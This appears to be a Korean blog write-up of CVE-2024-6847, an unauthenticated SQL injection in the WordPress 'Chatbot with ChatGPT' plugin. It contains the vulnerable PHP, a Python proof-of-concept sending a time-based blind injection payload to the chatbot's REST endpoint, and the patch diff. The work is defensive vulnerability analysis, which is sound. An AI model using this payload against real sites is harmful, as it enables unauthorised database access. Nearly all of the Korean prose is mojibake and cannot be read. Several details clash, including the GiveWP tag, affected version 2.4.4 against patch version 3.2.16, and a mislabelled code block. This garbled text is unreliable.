---
title: "[CVE-2024-6847] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
date: 2025-02-21 19:50:00 +0900
author: rlaaudrb1104
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ,ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼,WordPress, GiveWP, CVE-2024-6847, SQL Injection]
image: assets/img/wordpress-thumbnail.png
exclude_img: true
---


> ## **ğŸ’¡ ìš”ì•½**  
> **CVE-2024-6847**ì€ Chatbot with ChatGPTë¼ëŠ” ì›Œë“œí”„ë ˆìŠ¤ í”ŒëŸ¬ê·¸ì¸ ë²„ì „ 2.4.4 ì´í•˜ì—ì„œ ë°œê²¬ëœ **SQL Injection**ì·¨ì•½ì ì…ë‹ˆë‹¤.
> í•´ë‹¹ ì·¨ì•½ì ì€ ì‚¬ìš©ìê°€ ì œì¶œí•œ ë©”ì„¸ì§€ë¥¼ SQLë¬¸ì— ì‚¬ìš©í•  ë•Œ ì ì ˆí•œ íŒŒë¼ë¯¸í„° ê²€ì¦ê³¼ ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬ê°€ ì´ë£¨ì–´ì§€ì§€ ì•Šì•„ ë°œìƒí•©ë‹ˆë‹¤.
> ì´ë¥¼ í†µí•´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ì±—ë´‡ì— ë©”ì‹œì§€ë¥¼ ì œì¶œí•  ë•Œ ì•…ì˜ì ì¸ SQL ì¿¼ë¦¬ë¥¼ ì‚½ì…í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì— ì ‘ê·¼í•˜ê±°ë‚˜ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## 1. ì·¨ì•½ì  ê°œìš”

- **ì·¨ì•½ì  ë²ˆí˜¸:** CVE-2024-6847  
- **ì˜í–¥ ë°›ëŠ” ë²„ì „:** Chatbot with ChatGPT 2.4.4 ì´í•˜
- **ì·¨ì•½ì  ìœ í˜•:** SQL Injection
- **CVSS:** 9.8
- **ì·¨ì•½ì  íŒ¨ì¹˜ ë²„ì „:** 3.2.16

í•´ë‹¹ ì·¨ì•½ì ì€ WordPressì˜ Chatbot with ChatGPT ì—ì„œ ë°œê²¬ëœ **SQL Injection** ì·¨ì•½ì ì…ë‹ˆë‹¤.

í•´ë‹¹ ì·¨ì•½ì ì€ ì‚¬ìš©ìê°€ ì±—ë´‡ì—ê²Œ ë©”ì„¸ì§€ë¥¼ ì „ì†¡í•  ë•Œ `unique_conversation` íŒŒë¼ë¯¸í„°ì˜ ê²€ì¦ê³¼ ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬ê°€ ì´ë£¨ì–´ì§€ì§€ ì•Šì•„ ë°œìƒí•˜ëŠ” **SQL Injection** ì·¨ì•½ì  ì…ë‹ˆë‹¤.

## 2. ì·¨ì•½ì  ìƒì„¸

### 2.1 ì·¨ì•½ì  ì›ì¸
<details>
    <summary><b>wdgpt_log_chat í•¨ìˆ˜</b></summary>

```php
    public function wdgpt_log_chat( $answer, $post_ids, $unique_conversation ) {
    $messages   = $this->wdgpt_get_last_two_messages();
    $messages[] = array(
        'role'    => 'assistant',
        'content' => $answer,
    );
    $now        = current_time( 'mysql' );
    $post_id    = implode( ',', $post_ids );
    global $wpdb;

    $existing_entry = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wdgpt_logs WHERE unique_id = '$unique_conversation'" );

    if ( $existing_entry ) {
        $existing_post_ids = explode( ',', $existing_entry->post_ids );
        $new_post_ids      = array_unique( array_merge( $existing_post_ids, $post_ids ) );
        $wpdb->update(
            $wpdb->prefix . 'wdgpt_logs',
            array(
                'post_ids'   => implode( ',', $new_post_ids ),
                'created_at' => $now,
            ),
            array( 'unique_id' => $unique_conversation )
        );
        $log_id = $wpdb->get_var( "SELECT id FROM {$wpdb->prefix}wdgpt_logs WHERE unique_id = '$unique_conversation'" );
    } else {
        $wpdb->insert(
            $wpdb->prefix . 'wdgpt_logs',
            array(
                'post_ids'   => $post_id,
                'created_at' => $now,
                'unique_id'  => $unique_conversation,
            )
        );
        $log_id = $wpdb->insert_id;
    }

    foreach ( $messages as $message ) {
        $this->wdgpt_insert_log_message( $message, $log_id );
    }
}
```

</details>

`wdgpt_log_chat` í•¨ìˆ˜ì—ì„œ ì¸ìë¡œ ë°›ì•„ì˜¤ëŠ” `unique_conversation` ë³€ìˆ˜ë¥¼ ì ì ˆí•œ ì´ìŠ¤ì¼€ì´í”„ ì—†ì´ sql ì¿¼ë¦¬ì— ì§ì ‘ ì‚¬ìš©í•˜ê³  ìˆê¸° ë•Œë¬¸ì— SQL Injectionì´ ë°œìƒí•©ë‹ˆë‹¤.
```php
public function wdgpt_log_chat( $answer, $post_ids, $unique_conversation ) {
	...
	$existing_entry = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wdgpt_logs WHERE unique_id = '$unique_conversation'" );
	...
	$log_id = $wpdb->get_var( "SELECT id FROM {$wpdb->prefix}wdgpt_logs WHERE unique_id = '$unique_conversation'" );
	...
}
```

<details>
    <summary><b>wdgpt_log_chat í•¨ìˆ˜</b></summary>

```php
function wdgpt_retrieve_prompt( $request ) {

	try {
		$params              = json_decode( $request->get_body(), true );
		$question            = $params['question'];
		$conversation        = $params['conversation'];
		$unique_conversation = $params['unique_conversation'];
		$answer_generator    = new WDGPT_Answer_Generator( $question, $conversation );
		$answer_parameters   = $answer_generator->wdgpt_retrieve_answer_parameters();

		header( 'Content-type: text/event-stream' );
		header( 'Cache-Control: no-cache' );
		// Check if $answer_parameters is an empty array.
		if ( empty( $answer_parameters ) ) {
			echo 'event: error' . PHP_EOL;
			echo 'data: ' . __( 'Currently, there appears to be an issue. Please try asking me again later.', 'webdigit-chatbot' ) . PHP_EOL;
			ob_flush();
			flush();
			return '0';
		}
		$api_key                = $answer_parameters['api_key'];
		$temperature            = $answer_parameters['temperature'];
		$messages               = json_decode( json_encode( $answer_parameters['messages'], JSON_INVALID_UTF8_SUBSTITUTE ) );
		$max_tokens             = $answer_parameters['max_tokens'];
		$model_type             = $answer_parameters['model_type'];
		$top_summaries_post_ids = $answer_parameters['top_summaries_post_ids'];
		$openai                 = new OpenAi( $api_key );

		$answer = '';

		$chat = json_decode(
			$openai->chat(
				array(
					'model'       => $model_type,
					'messages'    => $messages,
					'temperature' => floatval( $temperature ),
					'max_tokens'  => $max_tokens,
					'stream'      => true,
				),
				function ( $ch, $data ) use ( &$answer, $answer_generator ) {
					$obj = json_decode( $data );
					// VÃ©rifiez si $obj est un objet et s'il a la propriÃ©tÃ© 'error' et si la propriÃ©tÃ© 'message' n'est pas vide.
					if ( is_object( $obj ) && property_exists( $obj, 'error' ) && ! empty( $obj->error->message ) ) {
						$answer_generator->wdgpt_insert_error_log_message( $obj->error->message, 0, 'stream_error' );
					} else {
						echo $data;
						$result = explode( 'data: ', $data );
						foreach ( $result as $res ) {
							if ( '[DONE]' !== $res ) {
								$arr = json_decode( $res, true );
								if ( isset( $arr['choices'][0]['delta']['content'] ) ) {
									$answer .= $arr['choices'][0]['delta']['content'];
								}
							}
						}

						// echo PHP_EOL;
						ob_flush();
						flush();
						return strlen( $data );
					}
				}
			)
		);

		$pattern     = '/\[(.*?)\]\((.*?)\)/';
		$replacement = '<a href="$2" target="_blank">$1</a>';

		$transformed_string = preg_replace( $pattern, $replacement, $answer );

		$transformed_string = str_replace( "\n", '<br>', $transformed_string );

		$answer_generator->wdgpt_log_chat( $transformed_string, $top_summaries_post_ids, $unique_conversation );
		return '0';
	} catch ( Exception $e ) {
		return __( 'There is currently an error with the chatbot. Please try again later.', 'webdigit' );
	}
}
```

</details>

ë˜í•œ `wdgpt_log_chat` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” í•¨ìˆ˜ì¸ `wdgpt_retrieve_prompt` í•¨ìˆ˜ì—ì„œë„ ì ì ˆí•œ ì´ìŠ¤ì¼€ì´í”„ ì—†ì´ `wpgpt_log_chat` í•¨ìˆ˜ë¡œ ì „ë‹¬í•˜ê³  ìˆìŠµë‹ˆë‹¤.

```php
function wdgpt_retrieve_prompt( $request ) {

	try {
		$params              = json_decode( $request->get_body(), true );
		$question            = $params['question'];
		$conversation        = $params['conversation'];
		$unique_conversation = $params['unique_conversation'];
		$answer_generator    = new WDGPT_Answer_Generator( $question, $conversation );
		$answer_parameters   = $answer_generator->wdgpt_retrieve_answer_parameters();
		...
		$answer_generator->wdgpt_log_chat( $transformed_string, $top_summaries_post_ids, $unique_conversation );
		return '0';
	} catch ( Exception $e ) {
		return __( 'There is currently an error with the chatbot. Please try again later.', 'webdigit' );
	}
}
```
ë”°ë¼ì„œ ì‚¬ìš©ìëŠ” `unique_conversation` ë§¤ê°œë³€ìˆ˜ë¥¼ í†µí•´ SQL Injectionì„ ìˆ˜í–‰í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

## 3. PoC

### 3.1 PoC ì½”ë“œ

```python
import requests
import time

url = "http://localhost:8081/wp-json/wdgpt/v1/retrieve-prompt"

payload = "mlg4w8is9cnlxonnq78' AND (SELECT 1 FROM (SELECT SLEEP(7))A) AND '1'='1"

conversation_data = [
    {
      "text": "Test",
      "role": "user",
      "date": "2025-01-24T12:16:42.179Z"
    }
  ]

headers = {
    "Content-Type": "text/plain;charset=UTF-8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

data = {
    "question": "test sql injection",
    "conversation": conversation_data,
    "unique_conversation": payload
}

start_time = time.time()
response = requests.post(url, json=data, headers=headers)

end_time = time.time()

response_time = end_time - start_time
if response_time > 7:
    print(f"SQL Injection successful. Response delay: {response_time:.2f} seconds.")
else:
    print("SQL Injection not successful or server did not delay.")
    
print(response.text)
```

### 3.2 ì£¼ìš” ê¸°ëŠ¥

- **URL**: `url` ë³€ìˆ˜ì—ëŠ” ìš”ì²­ì„ ë³´ë‚´ì•¼ í•  API ì—”ë“œí¬ì¸íŠ¸ê°€ í¬í•¨ë©ë‹ˆë‹¤. ì—¬ê¸°ì„œëŠ” `http://localhost:8081/wp-json/wdgpt/v1/retrieve-prompt`ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

- **Payload**: `payload` ë³€ìˆ˜ëŠ” SQL ì¸ì ì…˜ í˜ì´ë¡œë“œì…ë‹ˆë‹¤. ì´ëŠ” `unique_conversation` ê°’ì— ì‚½ì…ë˜ë©°, `SLEEP(7)`ì„ ì‚¬ìš©í•˜ì—¬ ì„œë²„ì˜ ì‘ë‹µì„ 7ì´ˆ ë™ì•ˆ ì§€ì—°ì‹œí‚µë‹ˆë‹¤.

- **Headers**: ìš”ì²­ì˜ í—¤ë” ì •ë³´ì…ë‹ˆë‹¤. ì¼ë°˜ì ì¸ HTTP ìš”ì²­ì„ ìœ„í•´ í•„ìš”í•œ ì •ë³´ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.

- **Data**: ìš”ì²­ ë³¸ë¬¸ì— í¬í•¨ë  ë°ì´í„°ë¥¼ êµ¬ì„±í•˜ëŠ” ë¶€ë¶„ìœ¼ë¡œ, `question`, `conversation`, ê·¸ë¦¬ê³  ì•…ì„± SQL ì¸ì ì…˜ í˜ì´ë¡œë“œê°€ í¬í•¨ëœ `unique_conversation` ê°’ì´ í¬í•¨ë©ë‹ˆë‹¤.

- **Response Time**: ì„œë²„ì˜ ì‘ë‹µ ì‹œê°„ì„ ì¸¡ì •í•˜ì—¬ `SLEEP(7)`ì´ ì‹¤í–‰ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì‘ë‹µ ì‹œê°„ì´ 7ì´ˆ ì´ìƒì¼ ê²½ìš°, SQL ì¸ì ì…˜ ê³µê²©ì´ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰ë˜ì—ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### ê²°ê³¼ í™•ì¸

- **ì„±ê³µì ì¸ SQL ì¸ì ì…˜**: ë§Œì•½ ì„œë²„ê°€ 7ì´ˆ ì´ìƒ ì§€ì—°ëœ ì‘ë‹µì„ ë³´ë‚¸ë‹¤ë©´, ì´ëŠ” SQL ì¸ì ì…˜ì´ ì„±ê³µì ìœ¼ë¡œ ì´ë£¨ì–´ì¡Œë‹¤ëŠ” ì‹ í˜¸ì…ë‹ˆë‹¤. ì´ ê²½ìš° `SQL Injection successful` ë©”ì‹œì§€ê°€ ì¶œë ¥ë©ë‹ˆë‹¤.

- **ì‹¤íŒ¨í•œ SQL ì¸ì ì…˜**: ì‘ë‹µ ì§€ì—° ì‹œê°„ì´ 7ì´ˆ ì´í•˜ì¼ ê²½ìš°, SQL ì¸ì ì…˜ì´ ì„±ê³µí•˜ì§€ ì•Šì•˜ê±°ë‚˜ ì„œë²„ê°€ ì´ë¥¼ ë°©ì–´í–ˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

## 4. íŒ¨ì¹˜ ë‚´ìš© ë° ë³€ê²½ì‚¬í•­ ë¶„ì„

```
diff --git a/path/to/file.php b/path/to/file.php
index 1234567..89abcde 100644
--- a/path/to/file.php
+++ b/path/to/file.php
@@ ê¸°ì¡´ DB ì¿¼ë¦¬ ë¶€ë¶„
- $existing_entry = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wdgpt_logs WHERE unique_id = '$unique_conversation'" );
+ $existing_entry = $wpdb->get_row( $wpdb->prepare(
+     "SELECT * FROM {$wpdb->prefix}wdgpt_logs WHERE unique_id = %s",
+     $unique_conversation
+ ) );
@@ ì‚¬ìš©ì ì…ë ¥ sanitization ë¶€ë¶„
- $question            = $params['question'];
- $conversation        = $params['conversation'];
- $unique_conversation = $params['unique_conversation'];
+ $question            = sanitize_text_field( $params['question'] );
+ $conversation = array_map(function($conv) {
+     return [
+         'text' => sanitize_text_field( $conv['text'] ),
+         'role' => sanitize_text_field( $conv['role'] ),
+         'date' => sanitize_text_field( $conv['date'] )
+     ];
+ }, $params['conversation']);
+ $unique_conversation = sanitize_text_field( $params['unique_conversation'] );
```

SQL Injection ì·¨ì•½ì ì„ í•´ê²°í•˜ê¸° ìœ„í•´, ë‹¤ìŒê³¼ ê°™ì€ ìˆ˜ì •ì´ ì´ë£¨ì–´ì¡ŒìŠµë‹ˆë‹¤.

### 4.1 `prepare()` ì‚¬ìš©

ìˆ˜ì •ëœ ì½”ë“œëŠ” SQL ì¿¼ë¦¬ì—ì„œ `wpdb->prepare()`ë¥¼ ì‚¬ìš©í•˜ì—¬ `unique_conversation` ê°’ì„ ì•ˆì „í•˜ê²Œ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì´ ë©”ì„œë“œëŠ” SQL ì¿¼ë¦¬ ë‚´ì— ì‚¬ìš©ë  ë³€ìˆ˜ë¥¼ ì•ˆì „í•˜ê²Œ escaping ì²˜ë¦¬í•˜ì—¬ SQL ì¸ì ì…˜ì„ ë°©ì§€í•©ë‹ˆë‹¤.

```php
$existing_entry = $wpdb->get_row( $wpdb->prepare(
    "SELECT * FROM {$wpdb->prefix}wdgpt_logs WHERE unique_id = %s",
    $unique_conversation
));
```

### 4.2 `sanitize_text_field()` ì‚¬ìš©
ë˜í•œ, `unique_conversation` ê°’ì€ ì…ë ¥ë°›ì€ í›„ `sanitize_text_field()` í•¨ìˆ˜ë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” í…ìŠ¤íŠ¸ í•„ë“œì—ì„œ ë¶ˆí•„ìš”í•œ HTML íƒœê·¸ë‚˜ íŠ¹ìˆ˜ ë¬¸ìë¥¼ ì œê±°í•˜ì—¬, ì•…ì˜ì ì¸ ìŠ¤í¬ë¦½íŠ¸ë‚˜ SQL ì¿¼ë¦¬ë¥¼ ì‚½ì…í•  ìˆ˜ ì—†ë„ë¡ ë§Œë“­ë‹ˆë‹¤.

```php
$unique_conversation = sanitize_text_field($params['unique_conversation']);
```